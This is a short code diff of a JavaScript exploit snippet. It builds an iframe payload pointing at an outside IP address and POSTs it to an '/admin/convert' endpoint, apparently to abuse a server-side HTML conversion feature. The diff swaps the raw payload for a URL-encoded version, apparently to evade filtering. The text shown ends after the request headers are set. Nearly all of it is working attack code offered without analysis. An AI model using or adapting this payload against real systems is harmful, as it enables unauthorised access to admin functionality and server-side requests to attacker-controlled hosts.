@@ -1,4 +1,4 @@
-const htmlCode = "<iframe src=http://54.180.108.161/ width=500 height=500></iframe>"; // Set the random value to send
+const htmlCode = "%3Ciframe%20src%3Dhttp%3A%2F%2F54.180.108.161%2F%20width%3D500%20height%3D500%3E%3C%2Fiframe%3E"; // Set the random value to send
 const xhr = new XMLHttpRequest(); // Create a new XMLHttpRequest object
 xhr.open("POST", "/admin/convert"); // Set the request method and endpoint
 xhr.setRequestHeader("Content-Type", "application/json"); // Set the request header
